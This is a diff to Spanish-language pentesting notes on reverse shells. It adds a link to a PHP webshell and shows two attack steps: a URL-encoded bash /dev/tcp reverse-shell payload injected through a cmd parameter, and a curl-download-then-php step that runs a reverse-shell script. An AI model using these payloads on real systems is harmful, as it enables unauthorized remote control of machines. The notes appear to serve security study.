@@ -7,6 +7,7 @@ Tenemos diferentes tipos de Revershell este pagina Web:
 * [ReverseShells-Generator](https://www.revshells.com/) 
 * [Cheatsheet-ReverseShells](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 * [Powershell for Pentesters](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters)
+* [P0wny-shell Webshell](https://github.com/flozz/p0wny-shell/blob/master/shell.php)
 
 **Reverse Shell**: Es una técnica que permite a un atacante conectarse a una máquina remota desde una máquina de su propiedad. Es decir, se establece una conexión desde la máquina comprometida hacia la máquina del atacante. Esto se logra ejecutando un programa malicioso o una instrucción específica en la máquina remota que establece la conexión de vuelta hacia la máquina del atacante, permitiéndose tomar el control de la máquina remota.
 
@@ -330,6 +331,11 @@ https://github.com/t3l3machus/hoaxshell     # Descargar la herramienta
 
 # Colocare la revershell en la web 
 ❯ ?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.50.129%2F4444%200%3E%261%27
+
+-----
+# Otra forma de subir la revershell y ejecutarla:
+❯ curl ❮IP❯ -o reverse.php        # El output del comando colocarlo en la ruta /tmp/ 
+❯ php reverse.php                 # Ejecutar php al archivo para obtener la revershell 
 ```
 
 ```bash 
